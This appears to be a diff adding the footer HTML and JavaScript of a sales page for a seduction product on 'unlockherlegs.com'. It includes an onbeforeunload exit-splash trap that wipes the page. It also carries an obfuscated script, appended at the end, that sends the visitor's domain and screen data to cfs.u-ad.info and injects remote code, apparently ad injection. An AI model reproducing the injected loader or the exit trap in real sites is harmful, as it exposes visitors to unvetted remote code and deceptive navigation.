+	if (typeof window.onload != 'function') { window.onload = func; } else { window.onload = function() { if (oldonload) { oldonload(); }  func(); }}
+}
+
+function addClickEvent(a,i,func) { 
+	if (typeof a[i].onclick != 'function') { a[i].onclick = func; } 
+}
+
+var theDiv = '<div id="ExitSplashDiv"  style="display:block; width:100%; height:100%; position:absolute; background:#FFFFFF; margin-top:0px; margin-left:0px;" align="center">';
+theDiv = theDiv + '<iframe src="'+exitsplashpage+'" width="100%" height="100%" align="middle" frameborder="0"></iframe>';
+theDiv = theDiv + '</div>';
+
+theBody = document.body; 
+if (!theBody) {theBody = document.getElementById("body"); 
+if (!theBody) {theBody = document.getElementsByTagName("body")[0];}}
+var PreventExitSplash = false;
+
+function DisplayExitSplash(){ 
+	if(PreventExitSplash == false){ 
+		window.scrollTo(0,0);
+		PreventExitSplash=true; 
+		divtag = document.createElement("div"); 
+		divtag.setAttribute("id","ExitSplashMainOuterLayer"); 
+		divtag.style.position="absolute"; 
+		divtag.style.width="100%"; 
+		divtag.style.height="100%"; 
+		divtag.style.zIndex="99"; 
+		divtag.style.left="0px"; 
+		divtag.style.top="0px"; 
+		divtag.innerHTML=theDiv; 
+		theBody.innerHTML=""; 
+		theBody.topMargin="0px"; 
+		theBody.rightMargin="0px"; 
+		theBody.bottomMargin="0px"; 
+		theBody.leftMargin="0px"; 
+		theBody.style.overflow="hidden"; 
+		theBody.appendChild(divtag); 
+	return exitsplashmessage; 
+	}
+}
+
+var a = document.getElementsByTagName('A'); 
+for (var i = 0; i < a.length; i++) { 
+	if(a[i].target !== '_blank') {addClickEvent(a,i, function(){ PreventExitSplash=true; });} else{addClickEvent(a,i, function(){ PreventExitSplash=false;});}
+}
+
+disablelinksfunc = function(){
+	var a = document.getElementsByTagName('A'); 
+	for (var i = 0; i < a.length; i++) { 
+		if(a[i].target !== '_blank') {addClickEvent(a,i, function(){ PreventExitSplash=true; });} else{addClickEvent(a,i, function(){ PreventExitSplash=false;});}
+	}
+}
+
+hideexitcancelbuttonimage = function(){
+	document.getElementById('ExitCancelButtonImageDiv').style.display='none'; 
+}
+addLoadEvent(disablelinksfunc);
+
+		var chkcookie = getCookie("ulegs_web7b");
+		if(chkcookie == 1){
+		showIt();
+		}		
+		setCookie("ulegs_web7b","1","1");
+window.onbeforeunload = DisplayExitSplash;
+//]]>
+</script>
+
+
+
+<iframe src="https://ssl.clickbank.net/pitch/serv/customfooter.htm?footerKey=FL28FD8ANND3"
+width=100% style= "padding:0px;margin-top:10px" frameborder="0" scrolling="no"></iframe>
+<script type="text/javascript">
+    footerPath='https://ssl.clickbank.net';
+    footerKey='FL28FD8ANND3';
+</script>
+<script type="text/javascript" charset="UTF-8" src="http://www.unlockherlegs.com/webfiles/custom_footer.js"></script>		
+<script type="text/javascript" src="http://www.unlockherlegs.com/Goldfish_files/jquery.colorbox.js"></script>
+
+<script type="text/javascript">
+    function refreshCount() {
+      jQuery.ajax({
+        url: 'http://magneticmessaging.com/index.php?viewcount=1&video=1216&tok=ZxTaPZyTa',
+        success: function(data) {
+          jQuery('#the_number').animate({'opacity': 0.1},function() {
+            jQuery('#the_number').html(data);    
+            jQuery('#the_number').animate({'opacity': 1});
+          });
+          setTimeout('refreshCount();', 15000);
+        }
+      });
+    }
+
+    jQuery('document').ready(function() {
+      setTimeout('refreshCount();', 15000);
+    });
+  </script>
+  <div id="sitelock_shield_logo" class="fixed_btm" style="bottom:0;position:fixed;_position:absolute;left:0;"><a href="https://www.sitelock.com/verify.php?site=unlockherlegs.com" onclick="window.open('https://www.sitelock.com/verify.php?site=unlockherlegs.com','SiteLock','width=600,height=600,left=160,top=170');return false;" ><img alt="PCI Compliance and Malware Removal" title="SiteLock" src="http://shield.sitelock.com/shield/unlockherlegs.com"></a></div>
+		
+<!-- Google Code for Remarketing Tag -->
+<!--------------------------------------------------
+Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on:
+http://google.com/ads/remarketingsetup
+
+--------------------------------------------------->
+<script type="text/javascript">
+/* <![CDATA[ */
+var google_conversion_id = 1022777233;
+var google_custom_params = window.google_tag_params;
+var google_remarketing_only = true;
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://www.googleadservices.com/pagead/conversion.js">
+</script>
+
+<div style="display:inline;">
+<img height="1" width="1" style="border-style:none;" alt="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1022777233/?value=0&amp;guid=ON&amp;script=0"/>
+</div>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnvfMFeunVG1zQd3CM1iyu1QHt7N2Wpj9bA5cYZ78pylpgZJNFXqG4Jf%2bLWx1t8b8f7DLxLLTSCAj3byocKlI72mJ5VSUe6C8Me8Hp6eMk4HC%2fSyoWw%2bPSiCnOwZrylGntuuhgqprrTzxy6v9L9ezHog%2b0qMdsst77W%2bmIkYNzUerkW%2b%2fSKkvh8nfoJjqQoSngueMfgDgUX1sIh18LPZlRpooXD7qPVcHNQlkg34HmJCr%2bSpbppHT13DowQQVpcq0sXrFasLSswistKgBTtG3hsdg%2f3rq7pbg6LbNoomHXIufWLwGswpNtXfwuNGiY6H8YiikFPrnGkwbQ3%2b%2brUrVyEgJ%2flV8lrhTB5Hwb4J8wTCmDJmL9EEvbeqM2CMCEqgBxefAuoPg5MNEcOZHK4QP9ZabozfKxvqKwb8tMklhhpapNIZSJRWCbijmsSaUqw40a%2bTfZxgyLqjym3vrYDtibJNRBrPS%2fuhSkTRZ8qt7dNULr9SV%2fThhl%2f7W%2fPGpxNMN6xE6XI5w3Kmc%2fG29RxszyhR%2f690ksLYjExvNiKIgjhQ8xYEaNmMn5uDZtDv5TjeWn" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
